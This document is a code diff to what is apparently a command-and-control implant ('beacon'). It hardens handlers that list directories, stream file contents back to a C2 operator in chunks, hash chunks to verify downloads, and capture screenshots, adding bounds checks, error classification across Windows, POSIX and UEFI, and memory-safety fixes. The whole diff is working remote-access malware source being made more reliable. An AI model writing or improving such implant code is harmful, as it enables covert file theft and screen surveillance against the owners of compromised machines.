@@ -16,6 +16,13 @@
 // Wire helpers
 // =============================================================================
 
+/// Upper bound the beacon will read for one GetFileContent command — a
+/// ceiling only (the beacon allocates exactly what is requested); it exists
+/// so a hostile/malformed wire request cannot demand a huge single heap
+/// allocation. A larger request is clamped, which the protocol
+/// already permits (reads may return fewer bytes than asked — EOF does).
+constexpr UINT64 MAX_FILE_CHUNK_SIZE = 16 * 1024 * 1024;
+
 #pragma pack(push, 1)
 struct WireDirectoryEntry
 {
@@ -50,12 +57,16 @@ static VOID ToWireEntry(const DirectoryEntry &src, WireDirectoryEntry &dst)
     dst.VolumeSerial = src.VolumeSerial;
 }
 
-static USIZE DecodeWirePath(PCHAR command, USIZE commandLength, WCHAR *widePath, USIZE widePathSize)
+// Decodes a NUL-terminated CHAR16 path from the command buffer into the
+// handler's wide path buffer, normalizing separators. Returns false when the
+// path does not fit the buffer — truncating it would silently target the
+// WRONG directory, so the caller must refuse the command instead.
+static BOOL DecodeWirePath(PCHAR command, USIZE commandLength, WCHAR *widePath, USIZE widePathSize)
 {
     if (commandLength < sizeof(CHAR16))
     {
         widePath[0] = L'\0';
-        return 0;
+        return false;
     }
 
     PCCHAR16 wirePath = (PCCHAR16)(command);
@@ -63,6 +74,14 @@ static USIZE DecodeWirePath(PCHAR command, USIZE commandLength, WCHAR *widePath,
     USIZE wireLen = 0;
     while (wireLen < maxChar16 && wirePath[wireLen] != 0)
         wireLen++;
+
+    // Overflow check BEFORE converting: a wire path longer than the buffer
+    // would be silently cut mid-component by Char16ToWide.
+    if (wireLen >= widePathSize)
+    {
+        widePath[0] = L'\0';
+        return false;
+    }
 
     USIZE len = StringUtils::Char16ToWide(
         Span<const CHAR16>(wirePath, wireLen),
@@ -73,7 +92,91 @@ static USIZE DecodeWirePath(PCHAR command, USIZE commandLength, WCHAR *widePath,
         if (widePath[i] == L'\\' || widePath[i] == L'/')
             widePath[i] = (WCHAR)PATH_SEPARATOR;
     }
-    return len;
+    return true;
+}
+
+// Maps an Error to the platform-INDEPENDENT code carried on the wire. Runtime
+// errors already are platform-independent — their ErrorCodes value passes
+// through unchanged. OS errors (the chain's root) are classified HERE, the
+// only layer that knows which OS produced them, into the Fs_* CAUSE codes:
+// consumers branch on a stable enum and never mirror per-OS code tables.
+// Unmapped OS errors degrade to the chain's outer failure-site code (e.g.
+// Fs_OpenFailed) — still platform-independent, just less specific.
+static UINT32 ClassifyError(const Error &error)
+{
+    switch (error.RootPlatform())
+    {
+    case Error::PlatformKind::Windows:
+        switch (error.RootCode())
+        {
+        case 0xC0000022u: // STATUS_ACCESS_DENIED
+            return Error::Fs_AccessDenied;
+        case 0xC0000034u: // STATUS_OBJECT_NAME_NOT_FOUND
+        case 0xC000003Au: // STATUS_OBJECT_PATH_NOT_FOUND
+            return Error::Fs_PathNotFound;
+        case 0xC00000E6u: // STATUS_NO_SUCH_DEVICE
+        case 0xC00000C0u: // STATUS_DEVICE_DOES_NOT_EXIST
+        case 0xC00002B6u: // STATUS_DEVICE_REMOVED
+        case 0xC000026Eu: // STATUS_VOLUME_DISMOUNTED
+            return Error::Fs_DeviceGone;
+        default:
+            break;
+        }
+        break;
+    case Error::PlatformKind::Posix:
+        switch (error.RootCode())
+        {
+        case 1:  // EPERM
+        case 13: // EACCES
+            return Error::Fs_AccessDenied;
+        case 2:  // ENOENT
+        case 20: // ENOTDIR
+            return Error::Fs_PathNotFound;
+        case 6:  // ENXIO
+        case 19: // ENODEV
+            return Error::Fs_DeviceGone;
+        default:
+            break;
+        }
+        break;
+    case Error::PlatformKind::Uefi:
+        switch (error.RootCode() & 0xFFFFu) // Error::Uefi truncates to the low 32 bits; EFI codes are EFI_ERROR(n)
+        {
+        case 15: // EFI_ACCESS_DENIED
+            return Error::Fs_AccessDenied;
+        case 14: // EFI_NOT_FOUND
+            return Error::Fs_PathNotFound;
+        default:
+            break;
+        }
+        break;
+    default:
+        break;
+    }
+    return error.Code; // runtime failure-site code (platform-independent)
+}
+
+// Writes an error response carrying the failure's classification:
+// [status:u32 = StatusError][errorCode:u32] (8 bytes), where errorCode is a
+// platform-INDEPENDENT ErrorCodes value — an Fs_* cause code when the OS
+// error is recognized, otherwise the failure-site code. Success responses
+// are unaffected; older C2 parsers read the status word first and stop, so
+// the extra tail is ignored by them — new C2s use it to classify the failure
+// (access denied vs device removed vs path too long) instead of guessing.
+static VOID WriteErrorDetailResponse(PPCHAR response, PUSIZE responseLength, const Error &error)
+{
+    PCHAR buffer = new CHAR[8];
+    if (buffer == nullptr)
+    {
+        *response = nullptr;
+        *responseLength = 0;
+        return;
+    }
+    *response = buffer;
+    *responseLength = 8;
+    BinaryWriter writer{Span<UINT8>((UINT8 *)buffer, 8)};
+    writer.Write<UINT32>(StatusCode::StatusError);
+    writer.Write<UINT32>(ClassifyError(error));
 }
 
 // Writes a simple error response with the given status code. Always leaves
@@ -112,16 +215,20 @@ VOID Handle_GetDirectoryContentCommand(PCHAR command, USIZE commandLength, PPCHA
 {
     LOG_INFO("Handling GetDirectoryContentCommand.");
     // Buffer to hold the path from command
-    WCHAR directoryPath[1024];
-    // Decoding path from command
-    DecodeWirePath(command, commandLength, directoryPath, 1024);
+    WCHAR directoryPath[2048];
+    // Decoding path from command — a path that does not fit is rejected, never truncated
+    if (!DecodeWirePath(command, commandLength, directoryPath, 2048))
+    {
+        WriteErrorDetailResponse(response, responseLength, Error(Error::Fs_PathTooLong));
+        return;
+    }
     LOG_INFO("GetDirectoryContent: %ws", directoryPath);
 
     // Create a DirectoryIterator for the specified path and validate it
     auto result = DirectoryIterator::Create(directoryPath);
     if (!result)
     {
-        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
+        WriteErrorDetailResponse(response, responseLength, result.Error());
         return;
     }
     // Iterator successfully created, so we can now read entries
@@ -129,21 +236,38 @@ VOID Handle_GetDirectoryContentCommand(PCHAR command, USIZE commandLength, PPCHA
     Vector<DirectoryEntry> entries;
     if (!entries.Init())
     {
-        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
+        WriteErrorDetailResponse(response, responseLength, Error(Error::Fs_ReadFailed));
         return;
     }
-    // Iterate through the directory entries, skipping "." and "..", and add them to the vector
-    while (iter.Next())
+    // Iterate through the directory entries, skipping "." and "..", and add
+    // them to the vector. A REAL iteration failure (volume dismounted, access
+    // revoked mid-scan, unreadable entry) must surface as an error response —
+    // returning the entries gathered so far as a success would silently ship
+    // a truncated listing that the operator cannot distinguish from complete.
+    while (true)
     {
-        const DirectoryEntry &entry = iter.Get();
-        if (IsDotEntry(entry))
-            continue;
-        if (!entries.Add(entry))
+        auto next = iter.Next();
+        if (next)
         {
-            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
-            return;
+            const DirectoryEntry &entry = iter.Get();
+            if (IsDotEntry(entry))
+                continue;
+            if (!entries.Add(entry))
+            {
+                WriteErrorDetailResponse(response, responseLength, Error(Error::Fs_ReadFailed));
+                return;
+            }
+            LOG_INFO("Directory entry added: %ws", entry.Name);
+            continue;
         }
-        LOG_INFO("Directory entry added: %ws", entry.Name);
+
+        const Error &error = next.Error();
+        if (error.Platform == Error::PlatformKind::Runtime && error.Code == Error::Fs_NoMoreEntries)
+            break; // clean end of directory
+
+        LOG_ERROR("Directory iteration failed after %d entries: %e", entries.Count, error);
+        WriteErrorDetailResponse(response, responseLength, error);
+        return;
     }
 
     // Prepare the response buffer - writing entry count, status code and array of WireDirectoryEntry structures
@@ -174,51 +298,84 @@ VOID Handle_GetDirectoryContentCommand(PCHAR command, USIZE commandLength, PPCHA
 VOID Handle_GetFileContentCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
 {
     LOG_INFO("Handling GetFileContentCommand.");
+    // Validate the wire layout [readCount:u64][offset:u64][path:CHAR16..NUL]
+    // before reading it — a truncated command must not be dereferenced.
+    USIZE pathOffset = sizeof(UINT64) + sizeof(UINT64);
+    if (commandLength < pathOffset + sizeof(CHAR16))
+    {
+        WriteErrorDetailResponse(response, responseLength, Error(Error::Command_Invalid));
+        return;
+    }
     // Getting parameters from command buffer: read count, offset and file path
     UINT64 readCount = *(PUINT64)(command);
     UINT64 offset = *(PUINT64)(command + sizeof(UINT64));
+    if (readCount > MAX_FILE_CHUNK_SIZE)
+        readCount = MAX_FILE_CHUNK_SIZE; // defend the beacon heap from a hostile/large request
     LOG_INFO("Reading file content with offset: %llu and count: %llu.", offset, readCount);
 
-    // Decoding file path from command buffer
-    USIZE pathOffset = sizeof(UINT64) + sizeof(UINT64);
-    WCHAR filePath[1024];
-    DecodeWirePath(command + pathOffset, commandLength > pathOffset ? commandLength - pathOffset : 0, filePath, 1024);
+    // Decoding file path from command buffer — reject instead of truncate
+    WCHAR filePath[2048];
+    if (!DecodeWirePath(command + pathOffset, commandLength - pathOffset, filePath, 2048))
+    {
+        WriteErrorDetailResponse(response, responseLength, Error(Error::Fs_PathTooLong));
+        return;
+    }
     LOG_INFO("GetFileContent: %ws offset=%llu count=%llu", filePath, offset, readCount);
 
     auto openResult = File::Open(filePath, File::ModeRead);
     if (!openResult)
     {
-        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
+        WriteErrorDetailResponse(response, responseLength, openResult.Error());
         return;
     }
     LOG_INFO("File opened successfully: %ws", filePath);
 
-    // Prepare the response buffer - writing status code, bytes read and file content chunk
     File &file = openResult.Value();
-    *responseLength = sizeof(UINT32) + sizeof(UINT64) + (USIZE)readCount;
-    *response = new CHAR[*responseLength];
-    if (*response == nullptr)
+    auto setOffsetResult = file.SetOffset((USIZE)offset);
+    if (!setOffsetResult)
     {
-        LOG_ERROR("Failed to allocate the file content response for %llu bytes", readCount);
+        LOG_ERROR("Failed to set file offset: %llu, error: %e", offset, setOffsetResult.Error());
+        WriteErrorDetailResponse(response, responseLength, setOffsetResult.Error());
+        return;
+    }
+
+    // Read into a scratch buffer sized for the request; the response carries
+    // exactly the bytes actually read (header [status][bytesRead] + data), so
+    // a short read at EOF never ships trailing uninitialized heap memory.
+    PUINT8 scratch = new UINT8[(USIZE)readCount + 1];
+    if (scratch == nullptr)
+    {
+        LOG_ERROR("Failed to allocate the file read buffer for %llu bytes", readCount);
+        *response = nullptr;
         *responseLength = 0;
         return;
     }
 
-    auto setOffsetResult = file.SetOffset((USIZE)offset);
-
-    if(!setOffsetResult){
-        LOG_ERROR("Failed to set file offset: %llu, error: %e", offset, setOffsetResult.Error());
-        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
+    auto readResult = file.Read(Span<UINT8>(scratch, (USIZE)readCount));
+    if (!readResult)
+    {
+        LOG_ERROR("Failed to read file content, error: %e", readResult.Error());
+        delete[] scratch;
+        WriteErrorDetailResponse(response, responseLength, readResult.Error());
         return;
     }
+    UINT64 bytesRead = readResult.Value();
 
-    auto readResult = file.Read(Span<UINT8>((UINT8 *)(*response + sizeof(UINT32) + sizeof(UINT64)), (USIZE)readCount));
-
-    UINT32 bytesRead = readResult ? readResult.Value() : 0;
+    *responseLength = sizeof(UINT32) + sizeof(UINT64) + (USIZE)bytesRead;
+    *response = new CHAR[*responseLength];
+    if (*response == nullptr)
+    {
+        LOG_ERROR("Failed to allocate the file content response for %llu bytes", bytesRead);
+        *responseLength = 0;
+        delete[] scratch;
+        return;
+    }
 
     BinaryWriter writer{Span<UINT8>((UINT8 *)*response, *responseLength)};
     writer.Write<UINT32>(StatusCode::StatusSuccess);
     writer.Write<UINT64>(bytesRead);
+    Memory::Copy(*response + sizeof(UINT32) + sizeof(UINT64), scratch, (USIZE)bytesRead);
+    delete[] scratch;
 
     LOG_INFO("File content read successfully for %llu bytes requested, %llu bytes read", readCount, bytesRead);
 }
@@ -227,23 +384,33 @@ VOID Handle_GetFileContentCommand(PCHAR command, USIZE commandLength, PPCHAR res
 VOID Handle_GetFileChunkHashCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, [[maybe_unused]] Context *context)
 {
     LOG_INFO("Handling GetFileChunkHashCommand.");
+    // Validate the wire layout [chunkSize:u64][offset:u64][path:CHAR16..NUL]
+    USIZE hashPathOffset = sizeof(UINT64) + sizeof(UINT64);
+    if (commandLength < hashPathOffset + sizeof(CHAR16))
+    {
+        WriteErrorDetailResponse(response, responseLength, Error(Error::Command_Invalid));
+        return;
+    }
     // Getting parameters from command buffer: chunk size, offset and file path
     UINT64 chunkSize = *(PUINT64)(command);
     UINT64 offset = *(PUINT64)(command + sizeof(UINT64));
 
     LOG_INFO("Computing file chunk hash with offset: %llu and chunk size: %llu.", offset, chunkSize);
 
-    // Decoding file path from command buffer
-    USIZE hashPathOffset = sizeof(UINT64) + sizeof(UINT64);
-    WCHAR filePath[1024];
-    DecodeWirePath(command + hashPathOffset, commandLength > hashPathOffset ? commandLength - hashPathOffset : 0, filePath, 1024);
+    // Decoding file path from command buffer — reject instead of truncate
+    WCHAR filePath[2048];
+    if (!DecodeWirePath(command + hashPathOffset, commandLength - hashPathOffset, filePath, 2048))
+    {
+        WriteErrorDetailResponse(response, responseLength, Error(Error::Fs_PathTooLong));
+        return;
+    }
     LOG_INFO("GetFileChunkHash: %ws chunkSize=%llu offset=%llu", filePath, chunkSize, offset);
 
     // Attempt to open the file and validate the result
     auto openResult = File::Open(filePath, File::ModeRead);
     if (!openResult)
     {
-        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
+        WriteErrorDetailResponse(response, responseLength, openResult.Error());
         return;
     }
     LOG_INFO("File opened successfully: %ws", filePath);
@@ -255,13 +422,16 @@ VOID Handle_GetFileChunkHashCommand(PCHAR command, USIZE commandLength, PPCHAR r
     if (buffer == nullptr)
     {
         LOG_ERROR("Failed to allocate the chunk read buffer (%llu bytes)", bufferSize);
-        WriteErrorResponse(response, responseLength, StatusCode::StatusError);
+        WriteErrorDetailResponse(response, responseLength, Error(Error::Fs_ReadFailed));
         return;
     }
 
     SHA256 sha256;
     USIZE totalRead = 0;
-    // Read file in small chanks and update the hash untill we read the requested count or reach the end of file
+    // Read file in small chunks and update the hash until we read the
+    // requested count or reach the end of file. A read FAILURE is an error —
+    // hashing what happened to be read so far would return a digest of a
+    // truncated chunk as if it were valid, corrupting download verification.
     while (totalRead < chunkSize)
     {
         UINT64 bytesToRead = Math::Min(bufferSize, chunkSize - totalRead);
@@ -270,23 +440,36 @@ VOID Handle_GetFileChunkHashCommand(PCHAR command, USIZE commandLength, PPCHAR r
 
         if (!setOffsetResult)
         {
-            LOG_ERROR("Failed to set file offset: %llu", offset + totalRead);
-            WriteErrorResponse(response, responseLength, StatusCode::StatusError);
+            LOG_ERROR("Failed to set file offset: %llu, error: %e", offset + totalRead, setOffsetResult.Error());
+            WriteErrorDetailResponse(response, responseLength, setOffsetResult.Error());
             delete[] buffer;
             return;
         }
 
         auto readResult = file.Read(Span<UINT8>(buffer, (USIZE)bytesToRead));
-        UINT32 bytesRead = readResult ? readResult.Value() : 0;
+        if (!readResult)
+        {
+            LOG_ERROR("Failed to read file chunk at offset %llu, error: %e", offset + totalRead, readResult.Error());
+            WriteErrorDetailResponse(response, responseLength, readResult.Error());
+            delete[] buffer;
+            return;
+        }
+        UINT32 bytesRead = readResult.Value();
         if (bytesRead == 0)
-            break;
+            break; // clean EOF: the chunk extends past the end of the file
         sha256.Update(Span<const UINT8>(buffer, bytesRead));
         totalRead += bytesRead;
     }
     delete[] buffer;
     // Prepare the response buffer - writing status code and SHA-256 digest of the file chunk
-    *responseLength += SHA256_DIGEST_SIZE;
+    *responseLength = sizeof(UINT32) + SHA256_DIGEST_SIZE;
     *response = new CHAR[*responseLength];
+    if (*response == nullptr)
+    {
+        LOG_ERROR("Failed to allocate the chunk hash response");
+        *responseLength = 0;
+        return;
+    }
 
     UINT8 digest[SHA256_DIGEST_SIZE];
     sha256.Final(Span<UINT8, SHA256_DIGEST_SIZE>(digest));
@@ -569,8 +752,14 @@ VOID JpegCallback(PVOID context, PVOID data, INT32 size)
 }
 
 // Gets a screenshot of the specified display device
-VOID Handle_GetScreenshotCommand(PCHAR command, [[maybe_unused]] USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
+VOID Handle_GetScreenshotCommand(PCHAR command, USIZE commandLength, PPCHAR response, PUSIZE responseLength, Context *context)
 {
+    // Validate the wire layout [displayIndex:u32][quality:u32][isFullScreen:u32]
+    if (commandLength < 3 * sizeof(UINT32))
+    {
+        WriteErrorDetailResponse(response, responseLength, Error(Error::Command_Invalid));
+        return;
+    }
     // Retrieve parameters from command buffer
     auto displayIndex = *(PUINT32)(command);
     auto quality = *(PUINT32)(command + sizeof(UINT32));
